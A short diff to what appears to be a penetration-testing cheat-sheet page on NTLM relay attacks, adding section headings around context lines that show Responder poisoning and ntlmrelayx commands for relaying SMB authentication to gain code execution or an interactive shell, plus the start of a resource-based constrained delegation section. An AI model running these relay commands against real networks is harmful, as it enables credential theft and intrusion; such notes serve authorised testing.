@@ -13,7 +13,7 @@ seo:
   canonical: "" # custom canonical URL (optional)
   robots: "" # custom robot tags (optional)
 ---
-
+## Basic Ntlm relay
 - Get a code execution , after relaying smb :
 ```sh
 #need to admin privileges
@@ -26,6 +26,8 @@ sudo ntlmrelayx --no-http-server -smb2support -t 192.168.50.212
 Responder.py -I enp4s0 -wdFb
 ntlmrelayx -tf target.txt -smb2support -i
 ```
+
+## RBCD (http to ldap)
 
 - RBCD : 
 ```sh
